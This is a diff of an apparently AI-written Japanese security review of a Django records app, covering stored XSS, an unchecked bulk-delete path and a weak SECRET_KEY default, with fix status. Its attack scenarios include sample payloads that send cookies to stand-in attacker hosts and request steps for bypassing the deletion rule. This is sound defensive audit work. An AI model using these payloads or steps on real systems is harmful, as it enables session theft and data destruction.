@@ -1,196 +1,503 @@
-セキュリティレビュー結果
-====================
+# セキュリティレビュー結果（2026-08-28・リポジトリ全体）
 
-対象: プロジェクト全体（現在のブランチ・作業ツリーの状態、2026-08-26時点）
-方式: 2段階レビュー
-  1) サブタスクによる脆弱性候補の洗い出し（差分＋変更後ファイル全体を精査）
-  2) 別の独立サブタスクによる偽陽性フィルタリング（各候補を個別に再検証、信頼度スコア付け）
-  3) 上記に加え、コードベース内で既に確立されている安全なパターン
-     （`escapejs`/`json_script`フィルタの使用箇所）と比較する横断確認を追加実施し、
-     アプリ全体から高確度の脆弱性を洗い出した。
+対象: リポジトリ全体（差分に限定せず、新規混入・既存を問わず全コードを精査）
+  ※ ユーザー指示により、当初の /security-review テンプレート制約（ブランチ差分のみ・
+     新規混入のみ）を外し、common.js 全 innerHTML シンク、全 View/API の認可経路、
+     設定・シークレット・ファイル境界を横断的に洗い直した。
 
-コードの修正は行っていません（読み取り専用調査のみ）。
+重点確認項目（ユーザー指定）:
+  1. 操作系ボタン（削除/編集/ダウンロード）のクライアント側非表示（disabled / style.display /
+     *_url=None）と、対応する View/API のサーバー側権限チェックの一致（URL直打ちバイパス）
+  2. パスワード等の機微情報のハッシュ化・マスク表示
+  3. ファイルアップロード・OCR 等の外部境界での try/except の例外型捕捉の適切性
 
+方式: 4陣の並列サブタスク
+  A) インジェクション・出力エンコーディング（XSS / SQL / コマンド / テンプレート / パストラバーサル）
+  B) 認証・認可・IDOR・権限昇格・セッション・CSRF（全 View/API クラスを列挙して権限マトリクス化）
+  C) シークレット・暗号・パスワード/PII・ファイルアップロード/配信・外部境界の例外処理
+  D) 一括編集ステージング型改修（コミット 9358b6d）の個別検証
+  各候補を独立サブタスクで偽陽性フィルタ＋git比較し、その後こちらで主要箇所を直接再検証した。
 
-【高】1件: 格納型XSS — popup-select描画でのHTMLエスケープ漏れ
---------------------------------------------------------------
-- 該当箇所: static/js/common.js:292, 295（popup-selectの選択肢描画部分）
-- カテゴリ: stored_xss
-- 信頼度: 高（コードベース内の直接検証により確認。同一データフローを持つ他画面と比較して
-  エスケープ処理が一貫して欠落していることを確認済み）
-
-説明:
-  popup-select（部署／分類／カテゴリー選択ポップアップ）の選択肢描画で、APIから取得した
-  `item.label`をテンプレートリテラルで組み立てた文字列のまま`row.innerHTML`に代入している。
-
-    row.innerHTML = `<label><input type="checkbox" class="item-checkbox" value="${item.value}"
-      data-label="${item.label}" ${isChecked}> ${item.label}</label>`;
-
-  `item.label`の値は`core/api.py`の`BaseOptionListAPIView._group_items`/`_category_items`/
-  `_department_items`が返す`masters.Group.name`（分類名）・`masters.Category.name`
-  （カテゴリー名）・部署名であり、いずれも`models.CharField`のフリーテキストで、フォーム側
-  （masters/forms.py の GroupForm/CategoryForm）にもHTML特殊文字を制限するバリデーションは
-  存在しない。
-
-  さらに、簡易設計指示書Rev1.2の反映により、分類・カテゴリー管理は「部署」スコープが追加され、
-  管理者でない一般ユーザー（自部署の分類/カテゴリー担当者）も自部署内であれば分類名・
-  カテゴリー名を登録・編集できる（masters/views.py, masters/forms.py）。
-
-  一方、同じコードベース内で文書名・契約書名など他のユーザー入力をJS/HTMLコンテキストへ
-  埋め込む箇所（templates/documents/search.html, templates/contracts/search.html 等）では
-  一貫して`|escapejs`フィルタが使われており、popup-selectのこの箇所だけがエスケープを
-  欠いている。これは新機能追加（Rev1.2の部署スコープ分類/カテゴリー管理）によって、
-  従来は管理者のみが触れていたマスタ名にXSSペイロードを仕込める攻撃面が、部署単位の
-  一般ユーザーにまで広がった点が特に問題。
-
-攻撃シナリオ:
-  1. 自部署の分類/カテゴリー管理権限を持つ一般ユーザーが、分類名またはカテゴリー名に
-     `<img src=x onerror="fetch('https://attacker.example/steal?c='+document.cookie)">`
-     のようなペイロードを設定して登録する。
-  2. 別のユーザー（管理者を含む、どのロールでも）が文書/契約書の検索・登録・編集画面で
-     分類またはカテゴリーのpopup-selectを開くと、`innerHTML`経由でペイロードがそのまま
-     DOMに挿入され、閲覧者のブラウザ上でスクリプトが実行される。
-  3. セッションクッキーの窃取、CSRFトークンの取得、閲覧者の権限での不正操作（文書削除・
-     権限変更等の代理実行）につながり得る。
-
-推奨対応:
-  - `row.innerHTML`への組み込みをやめ、`textContent`によるテキスト設定、または
-    `document.createElement`＋`el.textContent = item.label`のようなDOM API経由の組み立てに
-    変更する。
-  - どうしても`innerHTML`を使う場合は、値の部分のみを別途HTMLエスケープするユーティリティ関数
-    を通す（既存コードベースの`|escapejs`相当の考え方をJS側にも導入する）。
+コードの修正は行っていません（読み取り専用調査）。
 
 
-【高】1件: 格納型XSS — `departments_json|safe`のscriptタグ埋め込み時のエスケープ漏れ
---------------------------------------------------------------
+════════════════════════════════════════════════════════════════════════
+対応結果（2026-08-28、ユーザー指示：優先度「高」「中」を1件ずつ修正）
+════════════════════════════════════════════════════════════════════════
+【高】H-1 修正済み — static/js/common.js に escapeHtml() を追加し、renderDetailPopup() の
+  プロパティ表・関連書類一覧の値をエスケープしてから innerHTML へ挿入。ブラウザ実機で
+  <img onerror> ペイロードが発火しないことを確認。
+【高】H-2 修正済み — showSearchPreview() の titleEl.innerHTML 代入を廃止し、
+  setSearchPreviewMessage() で <strong> の textContent ＋ 静的テキストノードで組み立てる方式に変更。
+  ブラウザ実機で escapejs 済みタイトルのペイロードが発火しないことを確認。
+【高】H-3 修正済み（2層）—
+  (1) core/file_serving.py 新設。BaseFileServeView / BasePendingPreviewView の配信で、PDF・
+      ラスター画像以外は as_attachment=True へフォールバックし、全レスポンスに
+      X-Content-Type-Options: nosniff と Content-Security-Policy: script-src 'none'; object-src 'none'
+      を付与。実機で PDF のインラインプレビュー（iframe）が維持されることを確認。
+  (2) core/upload_validation.py 新設。BaseUploadStep1View.post / BaseChunkUploadAPIView.post で
+      HTML/SVG/スクリプト等の能動的コンテンツのアップロードを拒否（拒否リスト方式、Office・PDF・
+      画像・テキスト・圧縮ファイルには影響なし）。原本はファイル種別無制限だが、ユーザー依頼の
+      セキュリティ修正に伴う意図的逸脱として HTML_REIMPL_CHECKLIST_ARCHIVE.md に記録。
+  ※ アプリ全体への CSP 導入・MEDIA の別オリジン配信は、テンプレートが原本由来の onclick 等
+     インラインハンドラに全面依存しているため段階的移行が必要。今回は見送り（下記「未対応」参照）。
+【中】M-1 修正済み — documents/contracts.views.BulkEditView の toggle_delete ハンドラと _commit の
+  確定前検証に deletion_services.can_delete() を追加。削除済み／登録から1週間以上経過した
+  レコードは一括編集からもマーク不可・確定不可。両アプリに回帰テストを追加。
+【中】M-2 修正済み — config/settings/prod.py で SECRET_KEY = env("SECRET_KEY")（デフォルト無し）に
+  変更。未設定なら ImproperlyConfigured で起動失敗することをサブプロセスで確認。.env.example の
+  プレースホルダも本物でないと分かる文言に変更。
+
+【低】L-1/L-2/L-3 未対応（ユーザー指示により低優先度は修正せず記録のみ）:
+  - L-1（権限APIのロール未検証）: 読み取り専用・マスタ名のみで PII/認証情報の漏洩や
+    PermissionProfile 変更は伴わない。チーム自身が同ファイル内コメントで「優先度: 低・見送り」と
+    記録済み。ただし core/api.py の実装（非管理者を部署スコープに制限）と既存コメントの前提が
+    矛盾している点は次回対応時に整理が必要。
+  - L-2（保管画面1のファイル選択リスト innerHTML）: self-XSS のみ。悪用には被害者が自分の
+    ディスク上の悪意あるファイル名を自分で選ぶ必要があり、他ユーザーへの影響は無い。
+  - L-3（ALLOWED_HOSTS デフォルト ["*"]）: 本アプリは絶対URL生成経路が乏しく実害は限定的。
+    M-2 と同じく prod.py で env.list("ALLOWED_HOSTS")（デフォルト無し）にするのが望ましいが、
+    低優先度のため今回は見送り。
+【情報】I-1 対応不可（xlsx 職員マスタ!B184 で明示指定された仕様のため逸脱不可、記録のみ）。
+
+【未対応（H-3 の中期対応、別途要検討）】
+  - アプリ全体 CSP（default-src 'self'、script-src から 'unsafe-inline' 除去）
+  - MEDIA を別オリジン（サンドボックスドメイン）から配信
+
+
+════════════════════════════════════════════════════════════════════════
+サマリ（優先度別）
+════════════════════════════════════════════════════════════════════════
+【高】3件
+  H-1 格納型XSS: 検索結果詳細ポップアップ renderDetailPopup の innerHTML 直組み立て（既存）
+  H-2 格納型XSS: 検索結果行クリックプレビュー showSearchPreview の innerHTML（escapejs では防げない）（既存）
+  H-3 格納型XSS: アップロードファイルのMIME/拡張子未検証 ＋ プレビューの同一オリジン inline 配信
+      ＋ CSP 不在（.html/.svg をアップロードして本文をペイロードにできる）（既存）
+
+【中】2件
+  M-1 一括編集のステージング型削除が can_delete()（登録1週間ルール／削除済み）をサーバー側で
+      検証しない（コミット 9358b6d で新規混入、重点確認項目1に該当）
+  M-2 SECRET_KEY に本番でも有効な安全でないハードコードデフォルト（prod.py で未オーバーライド）
+
+【低】3件
+  L-1 permissions/api.py OptionListAPIView のロール制御欠如（部署名・分類名の部署跨ぎ開示。チーム既知）
+  L-2 保管画面1のファイル選択リスト表示が innerHTML（self-XSS のみ、他ユーザー影響なし）
+  L-3 ALLOWED_HOSTS のデフォルトが ["*"]（prod.py で未オーバーライド）
+
+【情報】1件
+  I-1 初期パスワード "ja"+職員番号下4桁 が予測可能・初回変更強制なし（xlsx 職員マスタ!B184 準拠、逸脱不可）
+
+重点確認項目の結論:
+  1. ボタン非表示 vs サーバー側強制は documents / contracts / masters / organizations / accounts /
+     audit / core で一貫して一致。例外は M-1（一括削除の can_delete 未検証）と L-1（権限APIのロール未検証）の2件のみ。
+  2. パスワードは全経路 set_password（Argon2、並び順不変）、テンプレート・API・ログ・CSV出力すべてで
+     マスク／非プリフィル／非記録。逸脱なし。
+  3. ファイル/OCR 境界の try/except は具体的な例外型（OSError 等）を捕捉し logger.exception ＋
+     利用者向け応答。広域 except は「1件/1ページの失敗で全体を止めない」設計判断としてコメント明記済み。逸脱なし。
+  クリーンだったカテゴリ: SQLインジェクション、コマンドインジェクション、テンプレートインジェクション、
+  パストラバーサル、zip-slip、安全でないデシリアライズ（pickle/yaml/eval なし）、CSRF（csrf_exempt ゼロ）、
+  セッション管理（DBバック・cycle_key・サーバー側アイドルタイムアウト）、CSV数式インジェクション（sanitize_csv_row）。
+
+
+════════════════════════════════════════════════════════════════════════
+【高】H-1: 格納型XSS — 検索結果詳細ポップアップ renderDetailPopup の innerHTML 直組み立て
+════════════════════════════════════════════════════════════════════════
 - 該当箇所:
-  templates/accounts/staff_edit.html:126
-  templates/accounts/staff_list.html:148
-  templates/accounts/staff_regist.html:106
-  templates/organizations/dept_list.html:96
-  （データ生成元: organizations/services.py:98-114 `departments_json()`）
-- カテゴリ: stored_xss
-- 信頼度: 高（`json.dumps()`の出力をそのまま`|safe`で`<script>`タグ内に埋め込んでおり、
-  `</script>`のエスケープが行われないことをコードから直接確認済み）
+    static/js/common.js:646        related_files を  `📎 ${f}`  で raw 連結
+    static/js/common.js:652-655    プロパティ表を
+      rows.map(([label, value]) => `<tr><td class="label">${label}</td><td>${value != null ? value : ""}</td></tr>`)
+      で組み立て view.innerHTML に代入
+- データ生成元（エスケープ無し）:
+    documents/api.py DetailAPIView（:57-116）  … title / department / group / category / memo / uploader
+    contracts/api.py DetailAPIView（:68-131）  … 上記 ＋ contract_partner / related_files[].display_name
+    いずれも JsonResponse（< > を HTMLエスケープしない）
+- カテゴリ: stored_xss（dom-xss）
+- 優先度: 高
+- 新規性: 既存（origin/main とシンク行バイト一致。本ブランチの renderDetailPopup 変更は
+  削除済みバナー文言とボタン表示切替のみでシンク行より後方）
 
 説明:
-  `departments_json()`は`Department`（部署）の`branch_name`（本支所名）・`section_name`
-  （部課名）を含むリストを`json.dumps()`でシリアライズするだけの関数で、`</script>`等の
-  HTML特殊シーケンスに対する対策は行っていない。
+  詳細ポップアップの各行の値（value）は全てユーザー編集可能なフリーテキスト:
+  - title / memo / contract_partner … 文書/契約書の登録・編集権限を持つユーザー（文書は全ログイン
+    ユーザー、契約書は contract_edit）が自部署内で設定
+  - department 名 … dept_management 権限保有者
+  - group.name / category.name … 分類/カテゴリー管理者（Rev1.2 で部署スコープ化され一般ユーザーも自部署内で編集可）
+  - uploader.name … staff_master 権限保有者
+  - related_files の display_name … アップロードファイル名由来。Django のマルチパートパーサは
+    / \ を除去するが < > " は残すため `<img src=x onerror=...>.pdf` がそのまま表示名になる
 
-    return json.dumps([{ ..., "branch_name": d.branch_name, ..., "section_name": d.section_name, ...}
-                        for d in Department.objects.order_by(...)])
-
-  これが4つのテンプレートで以下のように`|safe`フィルタ経由でインラインscriptタグに
-  直接埋め込まれている。
-
-    const departments = {{ departments_json|safe }};
-
-  `branch_name`/`section_name`は`organizations/forms.py`の`DeptRegistForm`/`DeptEditForm`
-  （`settings_menu_key = "dept_management"`権限を持つユーザーが利用可能）でフリーテキスト
-  入力可能であり、文字種・HTML特殊文字を制限するバリデーションが無い。
-
-  同じプロジェクト内で、他の同種のJSON埋め込み（`documents/storage2.html`,
-  `documents/edit.html`の`expiry_previews`等）は`|json_script`フィルタを使用しており、これは
-  Django側で`</script>`等を安全にエスケープする。`departments_json`だけが例外的に生の
-  `|safe`を使っており、確立された安全なパターンからの逸脱になっている。
+  DetailAPIView は閲覧者の部署スコープ（document_searchable_department_ids /
+  contract_searchable_department_ids）を検証するため、被害者は当該レコードを閲覧できる必要が
+  あるが、管理者・所属長・DepartmentViewScope／契約書 部門間閲覧設定で閲覧範囲を持つユーザーは
+  部署跨ぎで閲覧するのが通常運用。同部署・同ロールの被害者も成立。
 
 攻撃シナリオ:
-  1. 部署管理（dept_management）権限を持つユーザーが、部課名に
-     `</script><script>fetch('https://attacker.example/steal?c='+document.cookie)</script>`
-     のような文字列を設定して部署を登録・編集する。
-  2. 別のユーザー（staff_master権限で職員マスタ一覧/登録/編集画面を開く別ユーザー、
-     または部署管理一覧を開く別ユーザー）がページを表示すると、`</script>`によって元の
-     scriptタグが閉じられ、後続の任意スクリプトがそのままブラウザ上で実行される。
-  3. dept_managementとstaff_masterは別個の権限であり得るため、部署名を操作できるユーザーと
-     被害を受けるユーザーの権限境界をまたいだ攻撃が成立し得る。
+  1. 部署Aの一般ユーザーが自分の文書のタイトル（またはメモ欄）に
+     `<img src=x onerror="fetch('/permissions/authority_edit/1/',{...})">` 等を設定。
+  2. 部署Aを閲覧できる所属長／管理者が検索画面で当該行をダブルクリック（ondblclick="openDetailPopup(...)"）。
+  3. innerHTML 代入時にペイロードが実行され、被害者のセッションで CSRFトークン窃取・
+     権限プロファイル改ざん・設定変更等が可能。
 
 推奨対応:
-  - `{{ departments_json|safe }}`を`{{ departments|json_script:"departments-data" }}`
-    （Djangoの`json_script`テンプレートタグ）に置き換え、JS側は
-    `JSON.parse(document.getElementById("departments-data").textContent)`で読み込む形に変更する。
-  - `departments_json()`自体をPythonのdict/listのまま返すように変更し、シリアライズと
-    エスケープをテンプレート側の`json_script`に一元化するとより安全。
+  - renderPopupPopupItems（common.js:314-338、同種脅威を認識して既に DOM API 化済み。:320 のコメント参照）
+    と同じく、表を document.createElement ＋ textContent で組み立てる。
+  - 文字列組み立てを維持する場合は value と related_files の各要素を HTMLエスケープしてから挿入
+    （label 側は静的で安全）。共通の escapeHtml ヘルパーを common.js に追加するのが望ましい。
 
 
-【低】1件: 権限管理オプションAPIのロール制御欠如（既知・対応見送り事項）
---------------------------------------------------------------
-- 該当箇所: permissions/api.py:13 `OptionListAPIView`
-- カテゴリ: broken_access_control
-- 信頼度: 中（実際に悪用可能だが影響範囲は限定的。開発チーム自身が同ファイル内コメントで
-  既に認識・記録済み）
+════════════════════════════════════════════════════════════════════════
+【高】H-2: 格納型XSS — 検索結果行クリックプレビュー showSearchPreview の innerHTML
+════════════════════════════════════════════════════════════════════════
+- 該当箇所:
+    static/js/common.js:100 / :102 / :104
+      titleEl.innerHTML = `<strong>${title}</strong><br><br>…`;
+- データ生成元:
+    templates/documents/search.html:104  onclick="showSearchPreview('{{ document.title|escapejs }}', …)"
+    templates/contracts/search.html:102  onclick="showSearchPreview('{{ contract.title|escapejs }}', …)"
+- カテゴリ: stored_xss（dom-xss）
+- 優先度: 高
+- 新規性: 既存
 
 説明:
-  `OptionListAPIView`は`LoginRequiredMixin`のみを継承しており、権限管理画面
-  （`SettingsMenuAccessMixin`相当のロール制御）へのアクセス権を持たない一般ユーザーでも、
-  ログインさえしていれば`/permissions/api/options/?type=dept`（全部署）や
-  `?type=group&doc_kbn=contract`（全分類）を直接呼び出して取得できる。
+  `|escapejs` は「JS文字列リテラル内で安全」にするだけで、`<` を `<` にエスケープする。
+  JSエンジンがリテラルを解釈した時点で title 変数には生の `<` が復元され、それを .innerHTML に
+  代入すると HTMLコンテキストに戻るため `<img src=x onerror=...>` が実行される。
+  onclick 属性・JS文字列からのブレイクアウトは escapejs で防げているが、関数内の innerHTML
+  シンクだけが無防備。
 
-  一方、同種の情報を返す`core/api.py`の`BaseOptionListAPIView`（documents/contracts検索・
-  保管画面用）は、非管理者に対して`visible_department_ids`／`contract_searchable_department_ids`
-  で自部署＋閲覧範囲にスコープしており、`organizations/api.py`も過去の監査
-  （2026-08-24）で同種の「全部署が無制限に取得できる」問題が発見・修正され、
-  `can_access_settings_menu_item`によるサーバー側チェックが追加された経緯がdocstringに
-  残っている。`permissions/api.py`だけがこの統一的な対策から外れている。
-
-  影響は部署名・分類/カテゴリー名という業務メタデータの開示にとどまり、PermissionProfile
-  自体の変更やPII・認証情報の漏洩は伴わない。同ファイル23-29行目付近には開発チーム自身に
-  よる「優先度: 低・見送り」の注記が既にある。
+  発火経路（いずれか）:
+  - :102  … プレビューURLが空（ダウンロード権限なし、または is_deleted でテンプレートが空文字を渡す）
+  - :104  … プレビューURLはあるが previewKind が image/pdf 以外（.docx 等 Office 形式。
+            get_preview_kind が None を返す形式が該当）
+  行の「シングルクリック」で発火するため H-1 より容易。
 
 攻撃シナリオ:
-  権限管理メニューへのアクセス権を持たない認証済みユーザーが、`/permissions/api/options/`
-  にtype/doc_kbnパラメータを変えて直接リクエストし、本来アクセスできないはずの全部署一覧・
-  全分類一覧（他部署分を含む）を取得する。
+  1. 一般ユーザーが非プレビュー形式の文書（Office ファイル等）のタイトルにペイロードを設定。
+  2. 別ユーザーが検索結果で当該行をクリック → titleEl.innerHTML 経由で被害者セッションで実行。
 
 推奨対応:
-  - `organizations/api.py`で採用済みの`can_access_settings_menu_item(user, "...")`による
-    サーバー側チェックと同様のロール制御を`OptionListAPIView.dispatch()`に追加し、他の
-    設定系APIとの一貫性を取る。
-  - 対応不要と判断する場合も、この判断根拠（他画面での露出状況の再確認結果）をコメントとして
-    更新しておくことを推奨する（現状のコメントの前提—「他画面でも同種ロールに露出済み」—は
-    `core/api.py`の実装と矛盾しているため）。
+  - タイトルは titleEl.textContent で設定し（または <strong> 子ノードを分離）、説明文は別の
+    静的テキストノードにする。escapejs 済みの値を innerHTML に流さない。
 
 
-対応状況（2026-08-26）
---------------------------------------------------------------
-【高】1件: popup-select（common.js）のHTMLエスケープ漏れ
-  → 修正済み。row.innerHTMLへのテンプレートリテラル埋め込みをやめ、document.createElement
-    ＋input.dataset.label／document.createTextNodeによるDOM API組み立てに変更
-    （static/js/common.js）。ブラウザで`<img src=x onerror=...>`をitem.labelに与えて
-    renderPopupPopupItems()を実行し、エスケープされたテキストとして表示されxssFired=falseと
-    なることを確認済み。
+════════════════════════════════════════════════════════════════════════
+【高】H-3: 格納型XSS — アップロードファイルのMIME/拡張子未検証 ＋ プレビューの同一オリジン inline 配信
+════════════════════════════════════════════════════════════════════════
+- 該当箇所:
+    core/upload_views.py:112       request.FILES.getlist("files") を拡張子・MIME 検証なしで save_pending_files へ
+    documents/forms.py UploadStep2Form / contracts/forms.py UploadStep2Form
+                                  … ファイルフィールドにバリデータ無し（accounts/forms.py:54 の
+                                    StaffCsvImportForm.clean_csv_file が .csv を検証しているのと対照的）
+    documents/models.py:58 / contracts/models.py:65   file = models.FileField(..., validators 無し)
+    core/record_views.py:52-54     FileResponse(obj.file.open("rb"), as_attachment=self.as_attachment,
+                                    filename=obj.display_name)  … content_type 未指定 →
+                                    mimetypes.guess_type(display_name) が使われる（.html→text/html、.svg→image/svg+xml）
+    documents/views.py:744 / contracts/views.py:810   PreviewView … as_attachment=False（Content-Disposition: inline）
+    documents/views.py:47          UploadStep1View(LoginRequiredMixin, …)  … 文書アップロードは全ログインユーザー可能
+    config/settings/base.py        … CSP（django-csp / Content-Security-Policy）の設定がプロジェクト全体に無い
+- カテゴリ: stored_xss / unrestricted_file_upload
+- 優先度: 高
+- 新規性: 既存（PreviewView はユーザー要望による実装、docstring 参照）
 
-【高】1件: departments_json|safeのscriptタグ埋め込み時のエスケープ漏れ
-  → 修正済み。organizations/services.pyの`departments_json()`（json.dumps文字列を返す関数）を
-    `departments_list()`（Pythonのlistをそのまま返す関数）に変更し、4テンプレート
-    （templates/accounts/staff_edit.html, staff_list.html, staff_regist.html,
-    templates/organizations/dept_list.html）を`{{ departments_json|safe }}`から
-    `{{ departments_pulldown|json_script:"departments-data" }}`＋
-    `JSON.parse(document.getElementById('departments-data').textContent)`に変更
-    （organizations/views.py, accounts/views.pyのcontext変数名も追随）。
-    organizations/tests.pyに`</script><script>`を含むbranch_nameのレンダリング結果を検証する
-    回帰テスト（test_department_name_with_script_tag_is_escaped_in_pulldown_json）を追加し、
-    ブラウザでも同等のペイロードでxssFired=falseとなることを確認済み。
-  ※ dept_list.htmlのビューは元々"departments"キーで一覧表示用querysetを渡していたため、
-    連動プルダウン用データは別名"departments_pulldown"にしてキー衝突を回避した。
+説明:
+  文書/契約書アップロードにファイル種別の許可リストが無いため、`poc.html` や `poc.svg`
+  （インラインJS可）を「文書」として登録できる。DownloadView（as_attachment=True）は強制
+  ダウンロードのため比較的安全だが、PreviewView は同ファイルを Content-Type: text/html /
+  image/svg+xml かつ Content-Disposition: inline で、アプリと同一オリジンから配信する
+  （MEDIA は静的配信ではなくこのログイン必須ビュー経由）。
 
-【低】1件: permissions/api.py OptionListAPIViewのロール制御欠如
-  → 対応見送り（ユーザー指示により本レビューでは低優先度のため未修正。理由は下記原文の
-    「推奨対応」欄の通りで、影響が部署名・分類/カテゴリー名という業務メタデータの開示に
-    留まりPII・認証情報の漏洩を伴わないため）。対応する場合はorganizations/api.pyと同様の
-    `can_access_settings_menu_item`チェックをdispatch()に追加すること。
+  フロントの検索プレビュー枠（iframe）は get_preview_kind が image/pdf のみを対象にするため
+  （SVG は IMAGE_EXTENSIONS から意図的に除外済み、core/file_type_services.py:6 のコメント参照）、
+  iframe 経由での自動実行はされない。しかし PreviewView の URL（/documents/preview/<int:pk>）は
+  連番で推測可能であり、ダウンロード権限を持つ被害者（管理者含む）に
+  「この文書見て: https://app/documents/preview/457」と社内チャット等で送るだけで、被害者が
+  URLを開いた瞬間にアプリのオリジンで任意スクリプトが実行される。内部向けツールでは十分現実的。
 
-検証: 上記2件の修正後、python manage.py testで全641件がOK（回帰なし）。
+  緩和が効かない点:
+  - SECURE_CONTENT_TYPE_NOSNIFF=True（prod）: レスポンスが実際に text/html / image/svg+xml
+    なので nosniff では止まらない。
+  - X_FRAME_OPTIONS=SAMEORIGIN: 同一オリジンなので無関係。
+  - CSP が無いため実行を制限できない。
+
+攻撃シナリオ:
+  1. 任意の一般ユーザーが `<script>fetch('https://attacker/steal?c='+document.cookie)</script>` を
+     含む poc.html を文書として登録。
+  2. ダウンロード権限を持つ別ユーザー（管理者含む）に /documents/preview/<pk> のリンクを送付。
+  3. 被害者がリンクを開くと、アプリオリジンでスクリプトが実行され、セッションクッキー窃取・
+     CSRFトークン取得・被害者権限での代理操作につながる。
+
+推奨対応:
+  - UploadStep2Form 等にファイル拡張子/コンテンツの許可リストバリデータを追加（PDF＋ラスター画像程度）。
+  - BaseFileServeView で、許可された安全な形式（PDF・画像）以外は as_attachment=True に
+    フォールバックし、配信レスポンスに Content-Security-Policy: sandbox と
+    X-Content-Type-Options: nosniff を明示付与する。
+  - アプリ全体に CSP を導入する（default-src 'self'、script-src から 'unsafe-inline' を外す）。
+    これは H-1 / H-2 の被害低減にも有効。
+  - 中期的には MEDIA を別オリジン（サンドボックスドメイン）から配信することを検討。
 
 
-補足: 除外した検討事項
---------------------------------------------------------------
-以下はDoS・レート制限・秘密情報のディスク保存など、本レビューの対象外として明示的に
-除外した（ユーザー影響の実証がない、または既知の除外カテゴリに該当するため）:
-  - CSVエクスポート/インポート処理（`sanitize_csv_row`による数式インジェクション対策は
-    温存されており問題なし）
-  - `mark_safe`/`eval`/`subprocess`/生SQL（`.raw()`/`cursor.execute()`）の使用箇所
-    （`core/views.py`, `core/widgets.py`にヒットしたが、いずれもユーザー入力を直接
-    渡していないことを確認済み）
-  - 部署スコープ・IDOR対策（documents/contracts間の共通化、`scoped_get_object_or_404`）は
-    既にコミット済み（f2cd70e）で、本レビュー時点で新規の抜けは確認されなかった
+════════════════════════════════════════════════════════════════════════
+【中】M-1: 一括編集のステージング型削除が can_delete() をサーバー側で検証しない
+════════════════════════════════════════════════════════════════════════
+- 該当箇所:
+    documents/views.py:457-459   （BulkEditView.post の toggle_delete ハンドラ）
+    documents/views.py:512-522   （BulkEditView._commit の削除ブランチ、obj.is_deleted = True）
+    contracts/views.py:538-540   （同 toggle_delete ハンドラ）
+    contracts/views.py:595-604   （同 _commit の削除ブランチ）
+- クライアント側ゲート（サーバー側と不一致）:
+    templates/documents/edit.html:133  {% if can_delete %} で「削除」ボタンをラップ
+    （can_delete = deletion_services.can_delete(self.object)、documents/views.py:596）
+- カテゴリ: broken_access_control（業務ルールのサーバー側未強制、URL直打ちバイパス）
+- 優先度: 中（信頼度 8/10）
+- 深刻度: 中（攻撃者の自部署スコープ内に限定。文書は全ログインユーザー、契約書は contract_edit 権限が必要）
+- 新規性: 新規混入（コミット 9358b6d でリグレッション。改修前 44e73ae は BulkEditView に削除機能が無く、
+  一括編集からの削除は EditDeleteView → BaseDeleteView.post 経由で can_delete を強制していた）
+
+説明:
+  コミット 9358b6d が一括編集をステージング型へ改修し、ページ単位の「削除」マーク →
+  BulkEditView._commit で一括確定する機構を新設した。新しい toggle_delete ハンドラと
+  _commit の削除ブランチは、いずれも deletion_services.can_delete() を呼ばない。
+  _commit の検証パス（documents/views.py:482-489）は to_delete の pk を明示的に continue で
+  スキップするため、削除マーク済みレコードは検証すらされない。
+
+  対して:
+  - クライアント側は {% if can_delete %} で「削除」ボタンを隠す
+  - 他の全サーバー側削除経路は can_delete() を強制（core/record_views.py:213 BaseDeleteView.post、
+    コメントに「UI側は…ボタン自体を隠すが、API直叩き等に備えサーバー側でも拒否する」と明記／
+    core/master_views.py）
+
+  can_delete()（core/deletion_services.py:20-22）は「obj.is_deleted が True」または
+  「登録から7日以上経過」で False を返す。部署スコープ自体は強制されている
+  （resolve_ordered_pks ＋ scoped_get_object_or_404 ＋ DBバックのサーバー署名セッション）。
+  欠落は7日／削除済みルールのチェックのみ。
+
+  既存の回帰テスト test_delete_rejected_after_window_even_via_direct_post（documents/tests.py:2971）は
+  単独編集経路のみをカバーし、一括経路の等価テストは無い。一括削除系テスト（tests.py:1223-1259）は
+  すべて期間内の新規作成文書を使用している。
+
+攻撃シナリオ（文書。契約書は加えて contract_edit 権限が必要）:
+  1. POST /documents/bulk-edit/start/  pks=<自部署スコープ内の、登録から7日以上経過した文書ID>
+  2. GET  /documents/bulk-edit/        → 二重送信トークン取得
+  3. POST /documents/bulk-edit/        bulk_action=toggle_delete ＋ トークン
+  4. GET  /documents/bulk-edit/        → 新トークン
+  5. POST /documents/bulk-edit/        bulk_action=update ＋ トークン
+  6. _commit が is_deleted=True を設定 → xlsx 保管!B300「登録から1週間以上経過したものは削除不可」を迂回。
+  論理削除レコードは即座に全検索・一覧から除外され、NOTICE_DELETED_THRESHOLD_MONTHS（既定1ヶ月）
+  経過後に purge_expired_deleted_records.py がDBレコード・ファイル実体ごと完全削除する
+  （復元機能は「不要」で確定済み、CLAUDE.md 参照）。業務ルールで保護されたレコードの恒久的破壊につながる。
+
+推奨対応:
+  - _commit の削除確定前に、to_delete の各 pk について deletion_services.can_delete(objs_by_pk[pk]) を
+    検証し、False が1件でもあればコミット全体を中断して該当ページへエラー付きジャンプ
+    （既存の invalid ハンドリング documents/views.py:491-502 と同じ扱い）。
+  - toggle_delete ハンドラ側でもマーク設定時に can_delete を検証（そもそもマークを付けられないようにする）。
+  - documents / contracts 両アプリで一括経路の回帰テストを追加。
+
+
+════════════════════════════════════════════════════════════════════════
+【中】M-2: SECRET_KEY に本番でも有効な安全でないハードコードデフォルト
+════════════════════════════════════════════════════════════════════════
+- 該当箇所:
+    config/settings/base.py:17   SECRET_KEY = env("SECRET_KEY", default="django-insecure-dev-key-change-me")
+    config/settings/prod.py      … SECRET_KEY を再定義せず、.env に SECRET_KEY が無くても既知キーで起動する
+    .env.example:1               SECRET_KEY=change-me（起動時チェックも無い）
+- カテゴリ: hardcoded_secret / weak_crypto
+- 優先度: 中（本番 .env の設定漏れが前提条件のため深刻度は条件付き。ただしリポジトリ内に
+  実際に有効なフォールバック鍵がコミットされている点で報告対象）
+
+説明:
+  prod.py は base.py の SECRET_KEY をオーバーライドしないため、本番デプロイで .env に
+  SECRET_KEY を設定し忘れると、リポジトリ公開値 "django-insecure-dev-key-change-me" で
+  そのまま起動する。この鍵が使われると、セッションクッキーの署名偽造、
+  PasswordResetToken 相当・signing.dumps 系トークンの偽造、messages フレームワークの改ざん等が
+  攻撃者に可能になる。CONTRACT_RETENTION_YEARS 等の他設定と異なり、鍵は「未設定なら起動失敗」で
+  なければならない。
+
+推奨対応:
+  - prod.py で SECRET_KEY = env("SECRET_KEY")（デフォルト無し）にし、未設定なら
+    ImproperlyConfigured で起動失敗させる。
